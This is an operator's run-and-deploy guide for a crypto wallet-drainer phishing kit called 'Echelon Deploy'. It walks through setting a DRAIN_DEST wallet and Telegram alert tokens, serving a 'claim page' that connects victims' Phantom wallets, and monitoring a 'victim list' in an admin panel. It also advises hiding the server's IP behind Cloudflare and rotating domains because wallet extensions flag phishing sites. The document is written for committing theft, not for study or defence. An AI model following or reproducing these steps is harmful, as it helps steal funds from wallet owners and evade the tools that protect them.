# Echelon Deploy — Run & Deploy Guide

## Test on your PC

1. Open a terminal in `echelon-deploy\site`.
2. Install deps (only need to do once):
   ```bash
   npm install
   ```
3. Copy the env example and fill in your real destination wallet:
   ```bash
   copy .env.example .env
   ```
   Edit `.env`:
   ```
   DRAIN_DEST=YourSolanaAddressHere
   TG_TOK=your_telegram_bot_token
   TG_CHAT=your_chat_id
   ```
4. Start the server:
   ```bash
   npm start
   ```
5. Open:
   - Claim page: http://localhost:8080
   - Admin panel: http://localhost:8080/admin

That's it. The page will serve from your machine.

## Deploy to Vercel

1. Install Vercel CLI and login:
   ```bash
   npm i -g vercel
   vercel login
   ```
2. In `echelon-deploy\site`, run:
   ```bash
   vercel
   ```
3. Add environment variables:
   ```bash
   vercel env add DRAIN_DEST
   vercel env add TG_TOK
   vercel env add TG_CHAT
   ```
4. Redeploy:
   ```bash
   vercel --prod
   ```

**Important:** Vercel serverless functions reset in-memory state on cold starts. Victim list and config changes won't persist. For real use, wire the API to Vercel KV or another store.

## Deploy to a VPS

### Option A: Deploy builder

1. Run the deploy builder on Windows:
   ```bash
   deploy.bat
   ```
2. Upload `deploy\echelon-deploy.zip` to your VPS.
3. On the VPS:
   ```bash
   unzip echelon-deploy.zip -d echelon
   cd echelon
   cp .env.example .env
   nano .env   # fill in DRAIN_DEST, TG_TOK, TG_CHAT
   npm install
   node serve.js
   ```
4. Keep it alive with PM2:
   ```bash
   npm install -g pm2
   pm2 start serve.js --name echelon
   pm2 save
   ```
5. Point your domain to the VPS. Put Cloudflare in front for IP hiding and SSL.

### Option B: Direct copy

If you already have a server, copy these files/folders to it:
- `public/` contents (index.html, admin.html, assets/)
- `serve.js`
- `package.json`
- `.env` (from `.env.example`)

Then run `npm install && npm start`.

## Quick checks after deploy

- Visit `https://your-domain.com/api/seed` — should return JSON with a base64-encoded `d` value.
- Visit `https://your-domain.com/api/config` — should return config JSON.
- Open the claim page, connect Phantom, and check that it loads without console errors.
- Open `/admin` to see the dashboard.

## Rotate domains

Wallet extensions flag phishing domains quickly. Plan to rotate every few days and keep fresh domains ready.
